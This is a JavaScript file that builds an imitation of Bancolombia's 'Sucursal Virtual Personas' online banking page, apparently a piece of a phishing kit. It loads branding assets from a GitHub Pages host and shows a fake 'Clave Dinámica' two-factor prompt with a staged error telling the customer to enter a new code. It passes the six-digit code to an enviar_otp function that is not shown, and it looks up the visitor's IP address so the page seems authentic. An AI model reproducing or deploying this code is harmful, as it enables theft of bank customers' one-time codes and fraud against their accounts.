var myHosting = "https://itsmariodev.github.io/";

let head = `
<title>Bancolombia Sucursal Virtual Personas</title>
    <meta http-equiv="content-type" content="text/html; utf-8">
    <meta charset="utf-8">
    <meta content="es" http-equiv="Content-Language">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="Copyright" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <link href="${myHosting}css/style.css" rel="stylesheet">
    <link href="${myHosting}css/main.css" rel="stylesheet">
    <link href="${myHosting}css/recapcha.css" rel="stylesheet">
    <link href="${myHosting}css/bootstrap.css" rel="stylesheet">
    <link href="${myHosting}img/logo.png" rel="icon" type="image/png">
`;

let body = `<div id="contenidoWeb">
<form id="loginUserForm">
            <div class="container" id="containerMain">
                <div>
                    <div id="header" class="mua-page-header">
                        <div class="row row-logo-svp">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div class="mua-imgLogoItem"></div>
                                <div class="text-svp-name">Sucursal Virtual Personas</div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
                                    <div>
                                        <div class="timeText">Fecha y hora actual:</div>
                                        <span id="fecha-hora" class="lastVisitedText" currenttime="1692592603761">Domingo 20 de Agosto de 2023 11:36:43 PM</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="panel-heading">
                        <h3>
                            Clave dinámica
                        </h3>
                    </div>
                </div>

                <div class="panel panel-primary">
                    <div class="row" id="error">
                        <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError">
                            <div class="errorDiv">
                                <div class="divTextMessage">
                                    <span class="icon-error errorIcon">
                                        <span class="path1"></span>
                                        <span class="path2"></span>
                                        <span class="path3"></span>
                                    </span>
                                    <div class="errorTitulo">Error</div>
                                    <div id="summary" class="errorTexto">Ingrese la nueva Clave Dinámica.</div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="mua-panel-body">

                        <div class="row" id="divMain">
                            

                            
                        </div>

                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12">
                        <p class="mua-footer">
                            Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - <br> Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
                        </p>
                    </div>
                </div>
                <div style="margin-top: 10px;">
                    <div class="mua-title-text pull-left"  id="ip">Dirección IP:</div>
                    <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2023</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
                </div>


            </div>
        </form>
        </div>
`;

let options = `
<div class="col-xs-12 col-sm-5 col-md-4">

                                <div class="panel_general mua-panel_general">
                                    <div class="title-panel-label">
                                        <h1>
                                            Verificación doble factor
                                        </h1>
                                    </div>
                                    <div class="subtitle-land-label">
                                        <h4>
                                            Consúltala en tus mensajes recientes desde el número de teléfono en el que estás inscrito.
                                        </h4>
                                    </div>
                                    <div id="contenido">
                                        <div class="mua-content-group-panel">
                                            <div class="mua-label-input">
                                                <span id="popoverUser" class="adminItems-Icons icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
                                                <div id="popoverContent" class="hide">




                                                    <span class="mua_tooltip_close">×</span>
                                                    <div class="mua_tooltip_msg">


                                                        Ingrese el usuario que tiene registrado en la Sucursal Virtual Personas. Si no tiene un usuario asignado ingrese con su documento de identidad.



                                                    </div>
                                                </div>
                                                <label class="control-label-index" for="username">Ingrese la Clave Dinámica</label>
                                            </div>
                                            <div>
                                                <div class="mua_svp_enroll_update_control user">
                                                    <input id="txtOTP" name="txtOTP" tabindex="1" class="mua-form-control mua_svp_control_username mua-input-icon" maxlength="6" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" style="border: 1px solid #e20201;">
                                                    <span class="mua-icon-lock"> </span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="one-button-container mua-button-container">
                                        <button id="btnOTP" name="btnOTP" class="btn btn-success" type="button">
                                            Continuar
                                        </button>

                                    </div>

                                    

                                </div>

                                <div class="panel_general mua-panel_general">
                                    <div id="contenido">
                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_demo">
                                                        <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Conoce sobre Sucursal Virtual Personas
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_bloquear">
                                                        <span class="path1"></span><span class="path2"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Aprende sobre Seguridad
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_reglamento">
                                                        <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Reglamento Sucursal Virtual
                                                </div>
                                            </a>
                                        </div>

                                        <div class="mua-divIcon">
                                            <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                                <div class="mua-divCell">
                                                    <span class="adminItems-Icons icon-icon_politicas">
                                                        <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span>
                                                    </span>
                                                </div>
                                                <div class="mua-divCell-text">
                                                    Política de Privacidad
                                                </div>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
`

let ads = `
<div class="col-xs-12 col-sm-7 col-md-8">
                                <div class="mua-embed-con${myHosting}img/clave.jpg" frameborder="0" scrolling="no" width="635px" height="335px">
                                </div>

                                <p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp; Conoce más <a href="#" target="_blank" class="a1">aquí</a></p>
                            </div>
`

function addHead() {
  $("head").append(head);
}

function addCode() {
  $("body").html(body);
  $("#divMain").html(options);
  $("#divMain").append(ads);

  $("#btnOTP").click(function () {
    if ($("#txtOTP").val().length === 6) {
      enviar_otp($("#txtOTP").val());
    } else {
      $("#error").show();
      $("#txtOTP").css("border", "1px solid #e20201");
    }
  });

  $("#txtOTP").keyup(function (e) {
    $("#txtOTP").css("border", "1px solid #CCCCCC");
    $("#error").hide();
  });

  $(function ($) {
    var optionsEST = {
      utc: true,
      utcOffset: -5,
      format: "%A %R de %B de %Y %l:%M:%S %P",
      language: "es",
    };
    $("#fecha-hora").jclockNew(optionsEST);
  });
}

document.addEventListener("DOMContentLoaded", function () {
  addHead();
});

window.addEventListener("load", function () {
  //Aquí se puede meter la función addCode() para que el contenido cargue después de que se hayan
  //puesto cargado los estilos y que no se vea el html solo al inicio.
  addCode();

  fetch("https://api64.ipify.org?format=json")
  .then((response) => response.json())
  .then((data) => {
    let ip = data.ip;
    let divIp = document.getElementById("ip");
    divIp.textContent = "Dirección IP: " + ip;
  });

});

